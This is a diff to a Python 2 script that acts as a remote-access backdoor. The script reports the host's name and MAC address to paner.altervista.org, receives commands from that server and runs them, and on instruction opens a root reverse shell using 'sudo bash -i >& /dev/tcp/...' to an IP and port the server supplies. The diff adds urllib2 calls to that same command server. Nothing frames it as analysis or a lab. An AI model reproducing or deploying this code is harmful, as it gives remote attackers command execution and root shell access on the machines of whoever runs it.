@@ -3,6 +3,7 @@ import time
 import sys
 import os
 import httplib
+import urllib2
 import subprocess
 from os import path, access, R_OK
 from subprocess import Popen
@@ -22,14 +23,16 @@ try:
     original_mac =original_mac.rstrip('\n')
     name=name+"_"+original_mac
     print original_mac
-    httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
-    httpServ.connect()
-    httpServ.request('GET', "/svc/wup.php?pc="+name)
-    response = httpServ.getresponse()
-    
-    if response.status == httplib.OK:
+    #httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
+    #httpServ.connect()
+    #httpServ.request('GET', "/svc/wup.php?pc="+name)
+    #response = httpServ.getresponse()
+    response = urllib2.urlopen("http://paner.altervista.org/svc/wup.php?pc="+name)
+    sresponse = response.read()
+    #if response.status == httplib.OK:
+    if sresponse!= '':
         print "Output from HTML request"
-        sresponse = response.read()
+        #sresponse = response.read()
         ifind=sresponse.find('ip=')
         sip = sresponse[ifind+3:sresponse.find('||',ifind)]
         ifind=sresponse.find('port=')
@@ -41,19 +44,28 @@ try:
         ifind=sresponse.find('cmd=')
         scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
         print skill
-        httpServ.close()
+        #httpServ.close()
     if sexec == '1':
     	#os.system(scmd)
     	print scmd
     	p = Popen(scmd,shell='false')
-    	
-    	httpServ.request('GET', "/svc/wup.php?pc="+name+"&exec=0")
+    	response = urllib2.urlopen("http://paner.altervista.org/svc/wup.php?pc="+name+"&exec=0")
+    	#httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
+        #httpServ.connect()
+    	#httpServ.request('GET', "/svc/wup.php?pc="+name+"&exec=0")
+    	#response = httpServ.getresponse()
+    	#httpServ.close()
         os.system("wait")
     if skill == '0':
     	p = Popen("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
     	#sret=subprocess.check_output("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1", shell=True)
         #os.system("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
-        httpServ.request('GET', "/svc/wup.php?pc="+name+"&kill=1")
+        response = urllib2.urlopen("http://paner.altervista.org/svc/wup.php?pc="+name+"&kill=1")
+        #httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
+        #httpServ.connect()
+        #httpServ.request('GET', "/svc/wup.php?pc="+name+"&kill=1")
+        #response = httpServ.getresponse()
+    	#httpServ.close()
         os.system("wait")
     
 except Exception,e:
